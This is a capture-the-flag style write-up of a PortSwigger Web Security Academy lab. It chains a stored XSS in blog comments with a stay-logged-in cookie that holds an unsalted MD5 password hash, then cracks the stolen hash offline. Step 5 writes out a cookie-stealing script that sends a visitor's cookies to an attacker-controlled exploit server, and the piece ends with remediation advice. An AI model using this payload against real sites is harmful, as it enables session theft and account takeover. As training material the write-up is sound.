# Offline Password Cracking

**Platform:** PortSwigger Web Security Academy
**Category:** Authentication Vulnerabilities
**Difficulty:** Practitioner
**Status:** ✅ Solved

## Overview

This lab stores the user's password hash inside the `stay-logged-in` cookie — and the site also has a stored XSS vulnerability in its blog comment functionality. That combination is fatal: an attacker can steal another user's cookie with XSS, take the hash **offline**, and crack it at leisure with no rate limiting, no lockouts, and no further interaction with the server.

The cookie format is the same weak construction seen in related labs:

```text
stay-logged-in = Base64( username : MD5(password) )
```

Because the hash is an unsalted MD5 of a real password, recovering it from a public lookup database can be as simple as pasting it into CrackStation.

## Lab Objective

Obtain Carlos's `stay-logged-in` cookie, crack his password offline, then log in as `carlos` and delete his account from the **My account** page.

**Provided resources:** your credentials `wiener:peter` and the victim's username `carlos`.

## Walkthrough

### Step 1: Review the Lab Brief

The lab states the attack chain up front: the password hash lives in a cookie, and there is an XSS vulnerability in the comment functionality to steal it with.

<img width="2251" height="911" alt="step-1" src="https://github.com/user-attachments/assets/cc718685-b337-4e70-99ce-00502270e41e" />

### Step 2: Analyze Your Own Cookie First

Log in as `wiener` (with "stay logged in" enabled) and inspect your own `stay-logged-in` cookie in a request to `/my-account`. Working on your own account first is the safe way to reverse-engineer the format.

<img width="2241" height="1406" alt="step-2" src="https://github.com/user-attachments/assets/df387cbc-96dc-446f-93dd-d24166d7f342" />

### Step 3: Decode the Cookie Format

In Burp Decoder, Base64-decode your cookie. It reveals:

```text
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

<img width="3840" height="923" alt="step-3" src="https://github.com/user-attachments/assets/afd7a44b-e224-4371-84db-ecb5da1a364b" />

### Step 4: Verify the Hash Against Your Known Password

The 32-hex-character value is an MD5 hash. CrackStation confirms it is the MD5 of `peter` — my own password. The construction is proven before touching the victim:

```text
Base64( username : MD5(password) )
```

<img width="2799" height="1019" alt="step-4" src="https://github.com/user-attachments/assets/a68e62dc-ab12-472e-8590-066e0ff6a027" />

### Step 5: Plant the Stored XSS Payload

The lab hints that the blog's comment section is vulnerable to XSS. A simple test payload (`alert(1)`) is accepted, so I post a comment containing a cookie-stealing script that redirects the viewer's browser to my exploit server with their cookies attached:

```html
<script>document.location='//exploit-<id>.exploit-server.net/'+document.cookie</script>
```

<img width="2077" height="912" alt="step-5" src="https://github.com/user-attachments/assets/94c8ea6f-f1e8-414f-b3f6-1bb3b14d4ba5" />

### Step 6: Harvest Carlos's Cookie from the Exploit Server Log

When the victim (Carlos) views the post, the script executes in his browser and his cookies arrive in my exploit server's access log — including his `stay-logged-in` value:

```text
stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

Note that only Carlos's cookies appear: due to the same-origin policy, the payload can only read the cookies of the user in whose browser it executes.

<img width="3412" height="1750" alt="step-6" src="https://github.com/user-attachments/assets/0a9ad9ef-fd4c-4bcf-baf0-4cbfacc427a7" />

### Step 7: Decode Carlos's Cookie

Base64-decode the stolen value in Burp Decoder:

```text
carlos:26323c16d5f4dabff3bb136f2460a943
```

<img width="3819" height="945" alt="step-7" src="https://github.com/user-attachments/assets/8a1bd132-4b1d-4815-ae68-37f8103ce01f" />

### Step 8: Crack the Hash Offline

Paste Carlos's hash into CrackStation. As an unsalted MD5 of a weak password, it is already in the lookup database — his password is:

```text
onceuponatime
```

This is the "offline" part of the attack: the server saw nothing of this cracking activity, so no defense on the login page could have stopped it.

<img width="2838" height="1052" alt="step-8" src="https://github.com/user-attachments/assets/6efb98f9-589f-40fb-aaa1-4866e5c4031a" />

### Step 9: Log In as Carlos and Delete the Account

Log in with `carlos:onceuponatime`, open the **My account** page, and delete Carlos's account. The lab is solved.

<img width="3514" height="1029" alt="step-9" src="https://github.com/user-attachments/assets/184d03b4-5327-4d9e-8412-11f0ecb6fbe3" />

### Step 10: Reflection — Why Only One User's Cookies Arrived

A natural question after seeing the access log: if a thousand users' cookies existed, would they all arrive? No — an XSS payload only ever receives the cookies of the specific user whose browser executes it, because `document.cookie` is scoped by the same-origin policy to that user's session on that site. Each victim must be lured to the payload individually.

<img width="2137" height="1194" alt="step-10" src="https://github.com/user-attachments/assets/5a33fec5-f62b-4c21-b9bb-7d4203623e95" />

## Key Takeaways

- Storing a password hash in a client-side cookie hands attackers the material for unlimited offline cracking attempts — no lockout, throttling, or monitoring applies.
- Unsalted fast hashes (like MD5) of human-chosen passwords fall instantly to public lookup databases and rainbow tables; a salt and a slow, memory-hard hashing function are essential for stored passwords.
- Chained vulnerabilities multiply impact: a "medium" stored XSS became full account takeover because of the cookie's design.

## Remediation

- Never place passwords or password hashes in cookies. Persistent login cookies should contain only a random, unguessable token, stored server-side as a hash.
- Store passwords with a salted, computationally expensive algorithm (bcrypt, scrypt, or Argon2).
- Prevent XSS through output encoding and input validation, and mark sensitive cookies `HttpOnly` so client-side scripts cannot read them.
